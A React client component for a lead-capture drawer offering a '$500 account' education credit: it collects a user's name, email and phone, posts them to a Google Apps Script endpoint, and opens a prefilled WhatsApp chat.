"use client"
import React, { useState, useEffect } from 'react';
import { Drawer } from 'vaul';
import { X, Send, CheckCircle2, Phone, Mail, User } from 'lucide-react';
import { ShinyButton } from './shinyBtn';
import { useDrawerStore } from '../store/index.store';
import { detectCountry } from '../utils/util';
import { toast } from 'sonner';

const PLATFORM_WHATSAPP = "+971500000000"; // Platform WhatsApp Number
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-uyPiyPDttDCasddkRP4-tTD2vqTQivU6MLnUU80g-r6Tsx3P8sVWiX6Zzrgj1zp2/exec";

export const VaultDrawer: React.FC = () => {
  const { isOpen, closeDrawer } = useDrawerStore();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "+971",
    message: "",
  });

  const [callingCode, setCallingCode] = useState("+971");
  const [phoneCodeLoading, setPhoneCodeLoading] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [isValidPhone, setIsValidPhone] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => {
    detectCountry()
      .then((code) => {
        setCallingCode(code);
        setFormData((prev) => ({ ...prev, phone: code + " " }));
        setPhoneCodeLoading(false);
      })
      .catch(() => {
        setPhoneCodeLoading(false);
      });
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const phoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;

    // Remove non-digits
    let digits = value.replace(/\D/g, "");

    // Remove country code digits if user pastes full number
    const ccDigits = callingCode.replace("+", "");
    if (digits.startsWith(ccDigits)) {
      digits = digits.slice(ccDigits.length);
    }

    // Limit length (UAE = 9 digits, general case adjusted to 15 for flexibility but UAE logic mentioned)
    // Applying the 9 digits limit for UAE as per request
    if (callingCode === "+971") {
        digits = digits.slice(0, 9);
        setIsValidPhone(digits.length === 9);
    } else {
        digits = digits.slice(0, 15);
        setIsValidPhone(digits.length >= 7);
    }

    const formatted = `${callingCode} ${digits}`;
    setFormData((prev) => ({ ...prev, phone: formatted }));
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isValidPhone) {
        toast.error("Please enter a valid phone number");
        return;
    }
    setIsLoading(true);

    try {
      await fetch(GOOGLE_SCRIPT_URL, {
        method: "POST",
        mode: 'no-cors', // Standard for GAS webapps if not handled via specialized proxy
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          Name: formData?.name,
          Email: formData?.email,
          PhoneNumber: " " + formData?.phone + "_",
          Message: " ",
        }),
      });

      toast.success("Message sent successfully");
      setSubmitted(true);
      
      const waNumber = PLATFORM_WHATSAPP.replace("+", "").replace(/\s/g, "");
      const message = encodeURIComponent(`Name: ${formData?.name}\nEmail: ${formData?.email}\nPhone: ${formData?.phone}\nInterested in $500 Education Credit.`);
      
      window.open(`https://wa.me/${waNumber}?text=${message}`, '_blank');

      setFormData({
        name: "",
        message: "",
        email: "",
        phone: callingCode,
      });
    } catch (error) {
      console.error(error);
      toast.error("Message send failed");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Drawer.Root open={isOpen} onOpenChange={(open) => !open && closeDrawer()} shouldScaleBackground>
      <Drawer.Portal>
        <Drawer.Overlay className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm" />
        <Drawer.Content className="bg-white flex flex-col rounded-t-[32px] md:rounded-3xl h-auto mt-24 fixed bottom-0 md:bottom-auto md:top-1/2 md:left-1/2 md:-translate-x-1/2 md:-translate-y-1/2 left-0 right-0 z-[60] outline-none md:max-w-lg shadow-2xl overflow-hidden">
          <div className="p-4 bg-white flex-1 overflow-y-auto max-h-[90vh] md:max-h-none">
            <div className="mx-auto w-12 h-1.5 flex-shrink-0 rounded-full bg-gray-300 mb-8 md:hidden" />
            
            <button 
              onClick={closeDrawer}
              className="absolute right-4 top-4 p-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-black transition-colors"
            >
              <X size={20} />
            </button>

            {!submitted ? (
              <div className="px-4 py-6">
                <div className="text-center mb-10">
                  <div className="inline-flex items-center justify-center w-16 h-16 bg-red-50 text-red-600 rounded-2xl mb-4">
                    <CheckCircle2 size={32} />
                  </div>
                  <Drawer.Title className="text-3xl font-bold text-gray-900 mb-2">
                    Claim $500 Account
                  </Drawer.Title>
                  <Drawer.Description className="text-gray-500">
                    Verify your identity to unlock your educational credit instantly.
                  </Drawer.Description>
                </div>

                <form onSubmit={handleSubmit} className="space-y-5">
                  <div className="relative">
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-1.5 ml-1">Full Name</label>
                    <div className="relative group">
                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-gray-400 group-focus-within:text-red-500 transition-colors">
                        <User size={18} />
                      </div>
                      <input
                        required
                        name="name"
                        type="text"
                        className="w-full pl-11 pr-4 py-3.5 rounded-2xl border border-gray-200 focus:border-red-500 focus:ring-4 focus:ring-red-500/10 outline-none transition-all duration-200 text-gray-900 bg-gray-50/50"
                        placeholder="John Doe"
                        value={formData.name}
                        onChange={handleChange}
                      />
                    </div>
                  </div>

                  <div className="relative">
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-1.5 ml-1">Email ID</label>
                    <div className="relative group">
                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-gray-400 group-focus-within:text-red-500 transition-colors">
                        <Mail size={18} />
                      </div>
                      <input
                        required
                        name="email"
                        type="email"
                        className="w-full pl-11 pr-4 py-3.5 rounded-2xl border border-gray-200 focus:border-red-500 focus:ring-4 focus:ring-red-500/10 outline-none transition-all duration-200 text-gray-900 bg-gray-50/50"
                        placeholder="john@example.com"
                        value={formData.email}
                        onChange={handleChange}
                      />
                    </div>
                  </div>

                  <div className="relative">
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-1.5 ml-1">Phone Number</label>
                    <div className="relative group">
                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-gray-400 group-focus-within:text-red-500 transition-colors">
                        <Phone size={18} />
                      </div>
                      <input
                        required
                        name="phone"
                        type="tel"
                        className={`w-full pl-11 pr-4 py-3.5 rounded-2xl border ${!isValidPhone && formData.phone.length > 5 ? 'border-red-300' : 'border-gray-200'} focus:border-red-500 focus:ring-4 focus:ring-red-500/10 outline-none transition-all duration-200 text-gray-900 bg-gray-50/50`}
                        placeholder={phoneCodeLoading ? "Loading code..." : `${callingCode} 50 123 4567`}
                        value={formData.phone}
                        onChange={phoneNumberChange}
                        disabled={phoneCodeLoading}
                      />
                      {isValidPhone && (
                        <div className="absolute inset-y-0 right-4 flex items-center text-green-500 animate-in fade-in zoom-in duration-300">
                          <CheckCircle2 size={18} />
                        </div>
                      )}
                    </div>
                  </div>

                  <ShinyButton 
                    className="w-full py-4 text-base mt-2" 
                    onClick={() => {}} // Managed by form submit
                  >
                    {isLoading ? (
                      <span className="flex items-center gap-2">
                        <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Submitting...
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        Get $500 Account via WhatsApp <Send size={18} />
                      </span>
                    )}
                  </ShinyButton>
                </form>
                
                <p className="mt-6 text-center text-xs text-gray-400 font-medium">
                  By signing up, you agree to our <span className="underline cursor-pointer">Terms</span> and <span className="underline cursor-pointer">Privacy</span>.
                </p>
              </div>
            ) : (
              <div className="px-4 py-16 text-center animate-in fade-in zoom-in duration-500">
                <div className="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-green-500/10">
                  <CheckCircle2 size={48} />
                </div>
                <h3 className="text-3xl font-bold text-gray-900 mb-4">Verification Sent!</h3>
                <p className="text-gray-600 mb-8 max-w-sm mx-auto leading-relaxed">
                  Excellent, {formData.name.split(' ')[0] || 'User'}! We've redirected you to WhatsApp to complete your $500 account activation.
                </p>
                <div className="flex flex-col gap-3">
                    <button 
                    onClick={closeDrawer}
                    className="w-full py-4 px-6 bg-black text-white font-bold rounded-2xl hover:bg-gray-900 transition-all active:scale-95"
                    >
                    Return to Home
                    </button>
                    <button 
                    onClick={() => setSubmitted(false)}
                    className="text-sm font-semibold text-gray-400 hover:text-black transition-colors"
                    >
                    Re-fill Form
                    </button>
                </div>
              </div>
            )}
          </div>
        </Drawer.Content>
      </Drawer.Portal>
    </Drawer.Root>
  );
};
